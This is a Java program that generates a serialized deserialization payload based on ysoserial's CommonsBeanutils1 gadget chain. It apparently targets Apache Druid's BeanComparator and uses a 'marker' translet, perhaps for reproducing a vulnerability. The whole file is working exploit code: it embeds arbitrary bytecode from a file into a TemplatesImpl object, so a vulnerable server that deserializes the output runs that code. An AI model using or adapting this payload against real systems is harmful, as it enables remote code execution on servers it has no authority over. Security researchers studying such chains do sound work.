import java.io.FileOutputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Field;
import java.math.BigInteger;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.util.PriorityQueue;
import org.apache.commons.beanutils.BeanComparator;

// Based on the primary ysoserial CommonsBeanutils1 object graph, using the
// actual unmodified Druid distribution's BeanComparator and a source-built
// fixed marker translet. No Framework payload code or custom target classes.
public class NativeBeanPayload {
    private static void field(Object object, String name, Object value) throws Exception {
        Field field = object.getClass().getDeclaredField(name);
        field.setAccessible(true);
        field.set(object, value);
    }

    public static void main(String[] args) throws Exception {
        Object template = Class.forName("com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl").getDeclaredConstructor().newInstance();
        field(template, "_bytecodes", new byte[][]{Files.readAllBytes(Paths.get(args[0]))});
        field(template, "_name", "NativeMarker");
        field(template, "_tfactory", Class.forName("com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl").getDeclaredConstructor().newInstance());
        BeanComparator comparator = new BeanComparator("lowestSetBit");
        PriorityQueue<Object> queue = new PriorityQueue<Object>(2, comparator);
        queue.add(BigInteger.ONE);
        queue.add(BigInteger.ONE);
        field(comparator, "property", "outputProperties");
        field(queue, "queue", new Object[]{template, template});
        try (ObjectOutputStream stream = new ObjectOutputStream(new FileOutputStream(args[1]))) {
            stream.writeObject(queue);
        }
        System.out.println("BeanComparator serialVersionUID=" + java.io.ObjectStreamClass.lookup(BeanComparator.class).getSerialVersionUID());
    }
}
